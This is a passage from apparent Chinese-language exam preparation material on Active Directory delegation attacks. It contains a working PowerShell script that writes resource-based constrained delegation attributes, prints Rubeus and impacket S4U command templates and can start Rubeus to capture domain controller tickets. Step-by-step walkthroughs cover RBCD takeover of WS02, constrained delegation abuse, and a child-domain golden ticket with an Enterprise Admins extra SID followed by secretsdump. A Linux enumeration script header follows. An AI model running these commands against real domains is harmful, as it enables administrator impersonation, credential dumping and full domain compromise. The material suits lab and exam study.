# 当前身份自检（WindowsIdentity / Impersonation 层面，决定后续能不能抓票）
function Show-M12dIdentity {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Output ("  当前身份        : " + $id.Name)
    Write-Output ("  SID             : " + $id.User.Value)
    Write-Output ("  认证类型        : " + $id.AuthenticationType)
    Write-Output ("  模拟级别        : " + $id.ImpersonationLevel)
    if ($id.User.Value -eq 'S-1-5-18') {
        Write-Output "  -> SYSTEM：可以跑 Rubeus monitor（需要抓 LSASS 里的 TGT）"
    } else {
        Write-Output "  -> 非 SYSTEM。Rubeus monitor 通常要 SYSTEM；本地管理员 + 高完整性"
        Write-Output "     也常能跑，但抓到的票取决于本机会话里的身份。"
    }
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    if ($p.IsInRole('S-1-5-32-544')) { Write-Output "  -> 属于本地管理员组（提权到 SYSTEM 再看 M06 模块）" }
}

# ---------------------------------------------------------------------------
# RBCD：查 / 写 / 回滚
# ---------------------------------------------------------------------------
function Get-M12dRbcd {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    $raw = $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Value
    Write-M12dHead "RBCD 现状：$ComputerName"
    Write-Output ("  DN : " + $dn)
    if (-not $raw) {
        Write-Output "  属性为空：还没有主体被授权，正是可写入的干净状态。"
        return $dn
    }
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList @($raw, 0)
    Write-Output ("  DACL 条目数 : " + $sd.DiscretionaryAcl.Count)
    foreach ($ace in $sd.DiscretionaryAcl) {
        $who = $ace.SecurityIdentifier.Value
        try { $who = $ace.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value } catch { }
        Write-Output ("   允许 {0} 以 {1} 方式代表他人" -f $who, $ace.AccessMask)
    }
    return $dn
}

function Set-M12dRbcd {
    param(
        [Parameter(Mandatory = $true)][string]$ComputerName,
        [Parameter(Mandatory = $true)][string]$FakeSam
    )
    $dn = Get-M12dComputerDn $ComputerName
    $pair = Get-M12dSid $FakeSam
    $sid = $pair[0]
    Write-M12dHead "写入 RBCD：$ComputerName <- $FakeSam ($sid)"

    $sddl = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
    Write-Output ("  SDDL : " + $sddl)
    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor -ArgumentList $sddl
    $buf = New-Object 'byte[]' $sd.BinaryLength
    $sd.GetBinaryForm($buf, 0)

    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Add($buf)
        $de.CommitChanges()
        Write-Output "  [+] 写入成功。务必记得任务结束后 -Mode RBCD-Rollback 回滚。"
    } catch {
        Write-Output ("  [!] 写入失败 : " + $_.Exception.Message)
        Write-Output "      排查：① 当前身份对 $dn 有没有 GenericWrite/GenericAll"
        Write-Output "            ② 写的是计算机对象的完整 DN，不是容器（上面 DN 已打印）"
        Write-Output "            ③ 若属性已有值，先 -Mode RBCD-Rollback 清掉再写"
        return
    }

    Write-Output ""
    Write-Output "  --- 攻击机（Kali）侧后续命令，替换占位符后执行 ---"
    Write-Output "  impacket-getTGT -dc-ip TARGET 'DOMAIN/$FakeSam:<假机器密码>'"
    Write-Output "  export KRB5CCNAME=$($FakeSam.TrimEnd('$')).ccache"
    Write-Output "  impacket-getST -spn 'cifs/TARGET.corp.local' -impersonate $script:ImpersonateUser \"
    Write-Output "      -dc-ip TARGET 'DOMAIN/$FakeSam:<假机器密码>'"
    Write-Output "  export KRB5CCNAME=$($script:ImpersonateUser).ccache"
    Write-Output "  impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET.corp.local"
}

function Clear-M12dRbcd {
    param([Parameter(Mandatory = $true)][string]$ComputerName)
    $dn = Get-M12dComputerDn $ComputerName
    Write-M12dHead "回滚 RBCD：$ComputerName"
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    try {
        $de.Properties['msds-allowedtoactonbehalfofotheridentity'].Clear()
        $de.CommitChanges()
        Write-Output "  [+] 属性已清空，目标机回到未被接管状态（考试复查要点）。"
    } catch {
        Write-Output ("  [!] 回滚失败 : " + $_.Exception.Message)
        Write-Output "      确认当前身份对该对象有写权限；或用 -Mode RBCD 查看现状后手工处理。"
    }
}

# ---------------------------------------------------------------------------
# 约束委派：枚举 + S4U 命令模板
# ---------------------------------------------------------------------------
function Get-M12dConstrained {
    param([Parameter(Mandatory = $true)][string]$Account)
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($script:Root)
    $s.Filter = "(sAMAccountName=$Account)"
    [void]$s.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    [void]$s.PropertiesToLoad.Add('userAccountControl')
    [void]$s.PropertiesToLoad.Add('servicePrincipalName')
    [void]$s.PropertiesToLoad.Add('distinguishedName')
    $r = $s.FindOne()
    Write-M12dHead "约束委派配置：$Account"
    if (-not $r) { Write-Output "  找不到账户 $Account"; return }
    $uacRaw = 0
    if ($r.Properties.Contains('userAccountControl')) { $uacRaw = [Convert]::ToInt32($r.Properties['userAccountControl'][0]) }
    $trans = ($uacRaw -band 0x100000) -ne 0
    Write-Output ("  DN                        : " + $r.Properties['distinguishedName'][0])
    Write-Output ("  SPN                       : " + (@($r.Properties['servicePrincipalName']) -join ' | '))
    Write-Output ("  TrustedToAuthForDelegation: " + $trans + "  (True=支持协议转换，S4U2Self 不需要被模拟者密码)")
    $targets = @($r.Properties['msDS-AllowedToDelegateTo'])
    if ($targets.Count -eq 0) { Write-Output "  msDS-AllowedToDelegateTo  : (空，不是约束委派账户)"; return }
    Write-Output "  可委派到的 SPN："
    foreach ($t in $targets) { Write-Output ("    - " + $t) }
    Write-Output "  注意：委派列表只有这些 SPN，票据不能用到别的机器/服务类上。"
}

function Show-M12dS4uCommands {
    param([string]$Account, [string]$TargetSpn)
    if (-not $TargetSpn) { $TargetSpn = 'cifs/TARGET.corp.local' }
    Write-M12dHead "S4U2Self + S4U2Proxy 命令模板（替换占位符）"
    Write-Output "【A】有协议转换（TrustedToAuthForDelegation，最常见）——不需要被模拟者密码"
    Write-Output "  Windows（Rubeus，会把票直接打进内存 /ptt）："
    Write-Output ("    .\\Rubeus.exe s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser \")
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "    .\\Rubeus.exe s4u /user:$Account /rc4:NTHASH /impersonateuser:$script:ImpersonateUser \"
    Write-Output ("        /msdsspn:$TargetSpn /ptt")
    Write-Output "  Linux（impacket）："
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output ("    export KRB5CCNAME=$script:ImpersonateUser.ccache")
    Write-Output ("    impacket-wmiexec -k -no-pass DOMAIN/$script:ImpersonateUser@TARGET")
    Write-Output ""
    Write-Output "【B】无协议转换——必须持有被模拟用户自己的凭据，只能走 S4U2Proxy"
    Write-Output ("    impacket-getST -spn '$TargetSpn' -impersonate $script:ImpersonateUser \\")
    Write-Output ("        -hashes :NTHASH -dc-ip TARGET 'DOMAIN/$Account:PASS'")
    Write-Output "  DC 强制 AES 时给 Rubeus 加 /aes256:<被模拟用户的 AES key>；"
    Write-Output "  被模拟者的 NTHASH 不能用于 S4U2Self，只能用于 S4U2Proxy。"
    Write-Output ""
    Write-Output "【C】委派列表里只有 http/ 这类服务类时的验证方式："
    Write-Output "    curl --negotiate -u : http://TARGET/      （SPN 为 http/TARGET）"
    Write-Output "    evil-winrm -i TARGET -r DOMAIN             （SPN 为 wsman/TARGET）"

    if ($Execute -and (Test-Path (Join-Path $script:ToolDir 'Rubeus.exe'))) {
        Write-Output ""
        Write-Output "  （-Execute 已给出，且 -ToolDir 下有 Rubeus.exe）"
        Write-Output "    脚本不保存口令：请在下面这行手工填 PASS 后执行（脚本不会自动跑它）"
        Write-Output ("    & (Join-Path '$script:ToolDir' 'Rubeus.exe') s4u /user:$Account /password:PASS /impersonateuser:$script:ImpersonateUser /msdsspn:$TargetSpn /ptt")
    }
}

# ---------------------------------------------------------------------------
# 非约束委派：利用前检查 + monitor/触发命令
# ---------------------------------------------------------------------------
function Get-M12dUnconstrained {
    Write-M12dHead "非约束委派利用前检查（场景 50）"
    $me = $env:COMPUTERNAME
    $host1 = if ($TargetComputer) { $TargetComputer } else { $me }
    Write-Output "  检查对象主机 : $host1"

    # 1) 该主机是否配置了非约束委派
    try {
        $dn = Get-M12dComputerDn $host1
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
        $uac = 0
        if ($de.Properties['userAccountControl'].Value) {
            $uac = [Convert]::ToInt32($de.Properties['userAccountControl'].Value)
        }
        if (($uac -band 0x80000) -ne 0) {
            Write-Output "  [1/4] 非约束委派 : 是（UAC 含 0x80000），这台机器可以作为落点"
        } else {
            Write-Output "  [1/4] 非约束委派 : 否（UAC=$uac 不含 0x80000）——换用 m12-ad-enum-windows.ps1"
            Write-Output "        -Mode Delegation 找真正配了非约束委派的主机再回来"
        }
    } catch {
        Write-Output ("  [1/4] 读计算机对象失败 : " + $_.Exception.Message)
    }

    # 2) 当前身份（抓票需要 SYSTEM）
    Write-Output "  [2/4] 身份自检"
    Show-M12dIdentity

    # 3) 打印服务管道是否可用（SpoolSample 依赖）
    Write-Output "  [3/4] 诱导向量可达性"
    $spoolPath = "\\$host1\pipe\spoolss"
    if (Test-Path $spoolPath) {
        Write-Output ("        $spoolPath 可访问 -> SpoolSample / printerbug 大概率可用")
    } else {
        Write-Output ("        $spoolPath 不可访问 -> 打印服务已关或被补丁挡，换 PetitPotam(EFSRPC)/DFSCoerce")
    }

    # 4) 工具是否就位
    Write-Output "  [4/4] 工具检查（-ToolDir $script:ToolDir）"
    foreach ($t in @('Rubeus.exe', 'SpoolSample.exe', 'printerbug.exe', 'PetitPotam.exe')) {
        $p = Join-Path $script:ToolDir $t
        if (Test-Path $p) { Write-Output ("        已就位 : " + $p) }
        else { Write-Output ("        缺失   : " + $t + "（非必须，缺就换等价工具或只用 monitor 被动等）") }
    }

    Write-Output ""
    Write-Output "  --- 利用步骤（两个窗口；加 -Execute 且工具就位时脚本会直接起 monitor）---"
    Write-Output "  窗口1（抓票）：.\\Rubeus.exe monitor /interval:5 /nowrap"
    Write-Output "  窗口2（诱导 DC 认证到本机）："
    Write-Output ("         .\\SpoolSample.exe DC01 $host1   （或 printerbug DC01 $host1）")
    Write-Output "  备选诱导：impacket-petitpotam -u USER@DOMAIN -p 'PASS' -dc-ip TARGET LHOST DC01.corp.local"
    Write-Output "  拿到 DC01\$ 的 base64 TGT 后回攻击机："
    Write-Output "         impacket-ticketConverter dc.txt dc.ccache"
    Write-Output "         export KRB5CCNAME=dc.ccache"
    Write-Output "         impacket-secretsdump -k -no-pass DC01.corp.local"
    Write-Output "  校验：klist 里主体应为 DC01\$；能 dump 出 krbtgt 说明是 DC 机器票。"

    if ($Execute) {
        $rubeus = Join-Path $script:ToolDir 'Rubeus.exe'
        if (Test-Path $rubeus) {
            Write-Output ""
            Write-Output "  [-Execute] 启动 Rubeus monitor（Ctrl-C 停止；拿到票就停）……"
            & $rubeus monitor /interval:5 /nowrap
        } else {
            Write-Output "  [-Execute] 但 $rubeus 不存在，只打印命令不做动作。"
        }
    }
}

# ---------------------------------------------------------------------------
# Enum：三类委派一次看全
# ---------------------------------------------------------------------------
function Get-M12dEnumAll {
    $root = $script:Root
    Write-M12dHead "非约束委派主机（场景 50 落点）"
    $s = New-Object System.DirectoryServices.DirectorySearcher
    $s.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s.Filter = '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
    $s.PageSize = 200
    [void]$s.PropertiesToLoad.Add('sAMAccountName'); [void]$s.PropertiesToLoad.Add('dnsHostName')
    foreach ($r in $s.FindAll()) { Write-Output ("  " + $r.Properties['sAMAccountName'][0] + "  " + $r.Properties['dnsHostName'][0]) }

    Write-M12dHead "约束委派账户（场景 52）"
    $s2 = New-Object System.DirectoryServices.DirectorySearcher
    $s2.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s2.Filter = '(msDS-AllowedToDelegateTo=*)'
    $s2.PageSize = 200
    [void]$s2.PropertiesToLoad.Add('sAMAccountName'); [void]$s2.PropertiesToLoad.Add('msDS-AllowedToDelegateTo')
    foreach ($r in $s2.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0] + " -> " + (@($r.Properties['msDS-AllowedToDelegateTo']) -join ', '))
    }

    Write-M12dHead "已配置 RBCD 的计算机（场景 51：属性非空=已被写入过）"
    $s3 = New-Object System.DirectoryServices.DirectorySearcher
    $s3.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($root)
    $s3.Filter = '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
    $s3.PageSize = 200
    [void]$s3.PropertiesToLoad.Add('sAMAccountName'); [void]$s3.PropertiesToLoad.Add('distinguishedName')
    foreach ($r in $s3.FindAll()) {
        Write-Output ("  " + $r.Properties['sAMAccountName'][0])
        Write-Output ("      " + $r.Properties['distinguishedName'][0])
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
function Show-M12dHelp {
    Write-Output @"

m12-delegation-attacks.ps1 —— RBCD / 约束委派 / 非约束委派

  -Mode Enum
      列出三类委派的现状（无副作用）
  -Mode RBCD -TargetComputer TARGET -FakeAccount 'FAKE01$' [-ImpersonateUser Administrator]
      把假机器账户写进目标机的 msDS-AllowedToActOnBehalfOfOtherIdentity，
      并打印攻击机侧 getTGT/getST/wmiexec 后续命令
  -Mode RBCD-Rollback -TargetComputer TARGET
      清空该属性（考试必须做，否则目标机处于被接管状态）
  -Mode Constrained -ServiceAccount svc_sql [-Spn 'cifs/TARGET.corp.local']
      查委派目标 SPN 与是否支持协议转换，打印 S4U 两套命令（Rubeus + impacket）
  -Mode Unconstrained [-TargetComputer 本机名] [-ToolDir C:\Tools] [-Execute]
      四项前置检查 + Rubeus monitor / 诱导认证命令；-Execute 直接起 monitor

  通用：-Domain DOMAIN（未加域或跨域时必填） -ImpersonateUser USER
        -Execute（默认只打印命令，不实际调用外部 exe）
占位符：DOMAIN=corp.local  TARGET=WS02  USER/PASS/NTHASH 由参数或打印模板替换。
"@
}

# ---------------------------------------------------------------------------
# 主流程
# ---------------------------------------------------------------------------
if ($Help) { Show-M12dHelp; return }

try { $script:Root = Initialize-M12dRoot }
catch {
    Write-Output "[!] 初始化失败：$($_.Exception.Message)"
    exit 1
}
Write-Output "[*] 搜索根 : $script:Root"

switch ($Mode) {
    'Enum' {
        Get-M12dEnumAll
    }
    'RBCD' {
        if (-not $TargetComputer -or -not $FakeAccount) {
            Write-Output "[!] -Mode RBCD 需要 -TargetComputer TARGET 与 -FakeAccount 'FAKE01$'"
            Write-Output "    例：.\m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'"
            Show-M12dHelp
            exit 1
        }
        Get-M12dRbcd $TargetComputer | Out-Null
        Set-M12dRbcd -ComputerName $TargetComputer -FakeSam $FakeAccount
    }
    'RBCD-Rollback' {
        if (-not $TargetComputer) {
            Write-Output "[!] -Mode RBCD-Rollback 需要 -TargetComputer TARGET"
            exit 1
        }
        Clear-M12dRbcd $TargetComputer
    }
    'Constrained' {
        if (-not $ServiceAccount) {
            Write-Output "[!] -Mode Constrained 需要 -ServiceAccount 服务账户名（如 svc_sql）"
            Write-Output "    不知道哪个账户配了约束委派？先跑 -Mode Enum"
            exit 1
        }
        Get-M12dConstrained $ServiceAccount
        Show-M12dS4uCommands -Account $ServiceAccount -TargetSpn $Spn
    }
    'Unconstrained' {
        Get-M12dUnconstrained
    }
    'Help' { Show-M12dHelp }
}

Write-Output ""
Write-Output "[*] 提示：票据相关的高价值动作（secretsdump / ticketer）都在攻击机做，"
Write-Output "[*]        Windows 侧只负责抓票与诱导认证；完成后记得回滚 RBCD 并清理票据。"
````

## 场景 51：对计算机对象有相关写权限，但不能直接管理目标主机（RBCD）

**场景回顾**：对目标机器（如 WS02）的计算机对象具备写权限（典型：GenericWrite/GenericAll 或能改 `msDS-AllowedToActOnBehalfOfOtherIdentity`）；同时具备一个"可被模拟主体"（自建机器账户即可，默认域策略允许普通用户加 10 台）。目标：以管理员身份访问 WS02。

**前提与假设**：当前用户能向域加机器账户（`MachineAccountQuota`>0，默认 10）；WS02 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 当前为空（未被利用过）；目标账户（Administrator）不是 Protected Users、未勾选"敏感账户不可委派"。

**准备（攻击机侧）**：impacket `addcomputer / getTGT / getST / wmiexec`；**Windows 侧**写属性函数见 `m12-delegation-attacks.ps1 -Mode RBCD`（用 .NET ADSI 写安全描述符，不依赖 ActiveDirectory 模块）。

**执行步骤**：
```bash
# ① 加一台假机器（记下密码）
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
  -dc-ip DC01.corp.local 'CORP/USER:PASS'
# ② Windows 侧：把 FAKE01$ 的 SID 写进 WS02 的 AllowedToActOnBehalfOfOtherIdentity
#    见 m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
# ③ 攻击机：给假机器要 TGT，再模拟 Administrator 要 cifs/WS02 的服务票据
impacket-getTGT -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=FAKE01.ccache
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
```
**用到的脚本**：`scripts/powershell/m12-delegation-attacks.ps1`（RBCD 模式：查 SID、写属性、回滚）。

**验证**：`wmiexec -k` 成功出 shell；`klist` 里能看到 `cifs/WS02.corp.local` 的 TGS 且主体是 `Administrator`。

**失败分支与备选**：
- `addcomputer` 报配额/权限错误（MAQ=0）→ 用你**已控制密码或哈希的既有服务账户**（带 SPN）当假主体，其余流程不变（它必须是你持有凭据的账户）。
- 属性写入失败 → 确认你写的是 WS02 计算机对象的完整 DN（不是容器）；用 `m12-delegation-attacks.ps1` 的回滚函数清掉属性再重试；GenericWrite 不等于能改该属性时，检查目标对象上是否有更宽松 ACL（换一台你确有写权限的机器）。
- `getST` 报 KDC 错 → S4U2Self 成功但 S4U2Proxy 被拒，常见原因：目标账户敏感不可委派 / 假主体无 SPN（addcomputer 会自动注册 `host/FAKE01`，若手动建账户要补 SPN）/ 票据过期，重新走 ①。
- 模拟 Administrator 被拒 → 换模拟其他管理员（如域管组的另一成员）。

**考试注意 OPSEC**：改 WS02 的委派属性是**持久痕迹**，完成任务后必须回滚（脚本提供 rollback），否则复查时目标机器处于被接管状态会扣分；假机器账户用完可删（可选，但至少删掉不再用的票据缓存）。

---

## 场景 52：控制了服务账户，存在约束委派，但只能访问指定服务

**场景回顾**：掌握一个配置了**约束委派（AllowedToDelegateTo）**的服务账户（如 `svc_sql`），能模拟任意用户但**只能**访问委派指定的 SPN（如 `cifs/WS02` / `http/WS02`），不能访问任意机器。

**前提与假设**：服务账户凭据有效；确知委派目标 SPN 与主机（枚举见 `m12-ad-enum-windows.ps1 -Mode Delegation`）；区分两种子情形——① `TrustedToAuthForDelegation`（协议转换，S4U2Self 不需要被模拟者密码）；② 无协议转换 → 必须持有被模拟用户的 TGT/密码（"约束委派 + 已知用户凭据"场景，靠 `getST` 的 `-hashes`/`-aesKey` 直接带）。

**准备（攻击机侧）**：`impacket-getST`；Windows 侧 `Rubeus s4u` 模板在 `m12-delegation-attacks.ps1 -Mode Constrained`。

**执行步骤**：
```bash
# 协议转换（最常见）：拿 svc_sql 的 TGT → S4U2Self(Administrator) → S4U2Proxy(cifs/WS02)
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
# 备选：无协议转换 → 用被模拟用户自己的哈希
impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
  -hashes :NTHASH -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
```
Windows 侧等价：`Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt`（协议转换）；无转换时给 Rubeus 加 `/aes256`（被模拟用户哈希不可用于 S4U2Self，只能走 S4U2Proxy）。

**用到的脚本**：`scripts/powershell/m12-delegation-attacks.ps1`（约束委派两子情形模板 + 目标 SPN 枚举）。

**验证**：拿到 `Administrator.ccache` 后 `wmiexec -k` 进 WS02；只允许 HTTP SPN 时改走 `curl --negotiate`/WinRM 相应工具验证而非 SMB。

**失败分支与备选**：
- 委派目标是 `cifs/WS02` 但你想用同一主机的其他服务（如 `http`）→ 若委派列表写的是 `cifs/WS02` 单条，不能改服务类；查 `AllowedToDelegateTo` 是否含 `http`/`wsman`，用 `-altservice` 仅当主机相同且配置允许多服务类。
- 模拟的 Administrator 无法访问（敏感不可委派）→ 换可模拟的管理员账户。
- 只有 NTHASH 无明文密码 → `getST` 带 `-hashes`；DC 强制 AES-only 时需 `-aesKey`（枚举里取）。
- 服务账户本身 SPN 需要（S4U 的前提是被模拟者是服务账户身份）——svc 账户一般自带 SPN，若没有先补一个。

**考试注意 OPSEC**：约束委派只对**指定 SPN 主机**有效，不要试图把票用到别的机器上浪费时间；模拟对象与目标服务按场景最小化，拿到目标后立即清理 ccache，避免票在攻击机留存。

---

## 场景 53：掌握了子域高权限，最终目标在林根

**场景回顾**：已控制子域（`child.corp.local`）高权限（含子域 krbtgt 或子域 DA 可 dump），最终目标资产在林根（`corp.local`）。**不能预设一定可行**：必须先判定信任类型/方向与 SID 过滤是否生效。

**前提与假设**：需要掌握——① 信任类型：林内父子信任（`TrustAttributes: WITHIN_FOREST`，SID 过滤默认不生效 → Extra SID 攻击可行）；还是外部/林间信任（SID 过滤默认开启 → Extra SID 无效）；② 方向：双向/单向（能认证过去即可）；③ 子域 krbtgt 哈希（Extra SID 黄金票据需要）或子域信任密钥。

**准备（攻击机侧）**：`nltest`/PowerShell 枚举信任（脚本 `m12-ad-enum-linux.sh -Mode Trust`）；`impacket-ticketer`（做 Extra SID 黄金票）；确认根域 SID（`Get-DomainSID`/ldapsearch）。

**执行步骤**：
```bash
# ① 判定：子域上查信任属性与双方 SID
nltest /domain_trusts /all_trusts
ldapsearch ... "(trustedDomain)" trustAttributes trustDirection     # 0x20=WITHIN_FOREST, 2=双向
# ② 用子域 krbtgt 做黄金票，塞入根域 Enterprise Admins SID
impacket-ticketer -nthash <child krbtgt NT> -domain child.corp.local \
  -domain-sid <child domain SID> \
  -extra-sid 'S-1-5-21-<ROOT-DOMAIN-SID>-519' Administrator
export KRB5CCNAME=Administrator.ccache
# ③ 认证到根域资产（根 DC 的 cifs 或 LDAP）
impacket-secretsdump -k -no-pass ROOTDC.corp.local
```
**用到的脚本**：`scripts/linux/m12-ad-enum-linux.sh`（信任/域 SID 枚举输出）；`scripts/infra/m12-laps-and-trust-notes.md`（判定表 + Extra SID 条件速查）。

**验证**：`secretsdump -k` 对根 DC 能 dump 出根域 `krbtgt` 即证明 Extra SID 生效（拿到根域身份）。若只拿到子域内容/被拒，说明过滤生效或方向不符，走失败分支。

**失败分支与备选**：
- 信任是外部/林间（SID 过滤开启）→ Extra SID 无效，别耗：改用跨域 ACL（子域 DA 常被授予根域某些资源权限，先枚举根域对子域主体的 ACL）或找根域中可达的其他入口（LAPS/委派/证书重新评估）。
- 单向信任方向是"根→子"（子域不能认证到根）→ Extra SID 与互信票都走不通，只能靠根域内其他路径。
- 没有子域 krbtgt 但已控子域 DA → 先在子域 DC `secretsdump` 拿 krbtgt 再做黄金票；拿不到 krbtgt（只控非 DC 高权限）→ 走子域内其他横向到 DC。
- 黄金票主体在根域认证失败（TGS 被拒）→ 检查 `/etc/hosts` 里根 DC FQDN、`-extra-sid` 的根域 SID 是否写对（少 519 后缀或根域 SID 抄错是高频错误）。

**考试注意 OPSEC**：黄金票属于"域内最高敏感"操作，只在确认信任判定（WITHIN_FOREST + 方向可行）后执行；ticketer 只在攻击机本地跑，不投递任何文件到目标；完成后清理 ccache。

---

#### 源码 `scripts/linux/m12-ad-enum-linux.sh` {#scripts-linux-m12-ad-enum-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# 用途：从 Linux（Kali）侧对 AD/LDAP 做枚举的命令模板集合——ldapsearch 基础/用户/
#       计算机/组/SPN/委派/LAPS/信任/SID，外加 nmap ldap 脚本、netexec、bloodhound-
#       python 三条辅助线。每种模式都先打印要执行的命令，再（默认）真正执行它。
# 场景：M12 场景 49（读 LAPS）、51（RBCD 前置：找可写计算机对象）、52（找委派与 SPN）、
#       53（信任判定 + 域 SID）。配合 scripts/infra/m12-laps-and-trust-notes.md 使用。
# 依赖：ldap-utils（ldapsearch，Kali: sudo apt install -y ldap-utils）；
#       nmap（base/nmap 模式）；netexec（netexec 模式）；bloodhound-python（bloodhound
#       模式）；impacket-lookupsid / python3（sid 模式，二选一）；
#       工具缺失时脚本不会静默退出，会打印可读错误并降级为"只打印命令"。
# 使用：./m12-ad-enum-linux.sh -m all -s DC01.corp.local -D corp.local \
#            -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m laps  -s DC01.corp.local -D corp.local -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m trust -s DC01.corp.local -D corp.local -u USER -p 'PASS'
#       ./m12-ad-enum-linux.sh -m base  -s DC01.corp.local -n      # 只打印命令不执行
# 占位符（脚本内一律用变量承接，运行前替换，不要写真实域名/IP/密码）：
#   TARGET = DC/目标主机 IP 或 FQDN（-s 传入，例 DC01.corp.local）
#   DOMAIN = AD 域名 FQDN（-D 传入，例 corp.local；NetBIOS 段用 -N，例 CORP）
#   USER / PASS / NTHASH = 绑定凭据（-u / -p / -H）；NTHASH 仅 netexec 与
#       bloodhound 模式可用（LDAP 简单绑定要明文，NTHASH 模式会自动提示并降级）
# 测试状态：未在真实域环境实测；本机 bash -n 通过，逻辑为"打印 + 执行 + 降级提示"
# 与 docs/12-ad-attacks.md 的差异说明：
#   1) 文档写成 `-Mode Trust`（PowerShell 风格），Bash 实际用 `-m trust`，含义一致。
#   2) 文档 53 场景的 nltest 属 Windows 命令，本脚本的 trust 模式用 ldapsearch
#      (objectClass=trustedDomain) 等价实现；nltest 原文保留在 m12-laps-and-
#      trust-notes.md 里，不在此脚本内执行。
#   3) 文档未要求 base/nmap/netexec/bloodhound/sid 五个模式，此处补齐，便于一条
#      命令跑完"未知域"的冷启动枚举。
# =============================================================================
set -u

MODE="all"
DC=""            # -s  TARGET：DC 主机（IP 或 FQDN）
DOMAIN=""        # -D  DOMAIN：域 FQDN
NETBIOS=""       # -N  NetBIOS 名（绑定用，留空则从 DOMAIN 推导：corp.local -> CORP）
USER=""          # -u
PASS=""          # -p
NTHASH=""        # -H
BASEDN=""        # -b  覆盖默认 BaseDN
OUTDIR="$HOME/osep/loot/m12"
DRY=0            # -n  只打印命令，不执行
PYBIN="$(command -v python3 || true)"

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

参数：
  -m <mode>   枚举模式（默认 all）：
              all         依次跑 base/users/computers/groups/spn/delegation/laps/trust
              base        RootDSE 命名上下文 + nmap ldap 脚本 + 匿名可读性探测
              users       域用户（sAMAccountName/UPN/description/pwdLastSet）
              computers   域计算机（dnsHostName/operatingSystem/最后登录）
              groups      域组 + 特权组成员（DA/EA/Schema Admins/Builtin Admins）
              spn         servicePrincipalName=*（Kerberoast 候选）
              delegation  非约束(UAC 524288)/约束(msDS-AllowedToDelegateTo)/
                          RBCD(msDS-AllowedToActOnBehalfOfOtherIdentity) 三类一次查全
              laps        LAPS 四属性探测（legacy ms-Mcs-AdmPwd* + Windows LAPS
                          msLAPS-Password* / msLAPS-EncryptedPassword）
              trust       trustedDomain：trustPartner/trustAttributes/trustDirection
                          + 判定表（WITHIN_FOREST=0x20 / 双向=3）
              sid         域 SID（impacket-lookupsid 优先，否则 python3 解 objectSid）
              nmap        nmap -n -sV --script "ldap* and not brute"
              netexec     netexec ldap / smb / winrm 三条快速口令喷射式探测
              bloodhound  bloodhound-python -c ALL（产出 zip 回本机 BloodHound 分析）
  -s <host>   DC / 目标主机（TARGET），必填
  -D <fqdn>   域 FQDN（DOMAIN），必填（用于推导 BaseDN 与绑定 DN）
  -N <name>   NetBIOS 域名（默认从 -D 取首段大写）
  -u <user>   绑定用户（USER）；留空则匿名绑定
  -p <pass>   明文密码（PASS）；给 -u 时必填
  -H <hash>   NT hash（NTHASH），仅 netexec / bloodhound 模式支持
  -b <dn>     手工指定 BaseDN（默认 DC=corp,DC=local 形式由 -D 推导）
  -o <dir>    产物目录（默认 ~/osep/loot/m12）
  -n          只打印命令不执行（dry run，写报告/考试笔记时用）
  -h          本帮助

退出码：0 正常 / 1 参数错误 / 2 依赖缺失且无法降级
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }

